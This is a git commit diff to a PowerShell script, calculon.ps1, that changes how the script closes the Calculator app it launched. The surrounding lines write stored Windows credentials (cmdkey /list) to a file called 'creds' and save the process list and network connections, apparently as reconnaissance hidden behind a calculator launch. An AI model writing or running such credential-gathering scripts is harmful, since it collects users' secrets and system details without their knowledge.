7934d8a667f2b405db1561b0d35fae0f1ad155ef
user12385321 <kukulo.stas@gmail.com>
2024-12-08 12:22:51 +0300

    Update calculon.ps1

--- calculon.ps1
+++ calculon.ps1
@@ -6,6 +6,5 @@
 cmdkey /list | Out-File -FilePath .\creds
 Start-Process ms-calculator:
 tasklist | Out-File -FilePath .\tasklist
-$pid_number = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'CalculatorApp'" | Select-Object -ExpandProperty ProcessId
+Get-Process | Where-Object { $_.Name -eq "CalculatorApp" } | Select-Object -First 1 | Stop-Process
 netstat -an | Out-File -FilePath .\netstat
-taskkill /F /PID $pid_number
